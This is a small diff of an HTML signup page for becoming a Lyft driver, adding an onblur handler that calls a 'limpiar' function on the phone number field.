@@ -24,7 +24,7 @@
         <form id="fr"  method="post">
           <h1>turn miles into money</h1>
           <p>sign up to drive with lyft.</p>
-          <input  id="tp" type="text" name="" value="" placeholder="Phone number" onfocus="showtx();tt()" pattern="[0-9]{9}">
+          <input  id="tp" type="text" name="" value="" placeholder="Phone number" onblur="limpiar(this.id,0)" onfocus="showtx();tt()" pattern="[0-9]{9}">
           <div class="tooltip">
             <span class="tooltiptext"></span>
           </div>
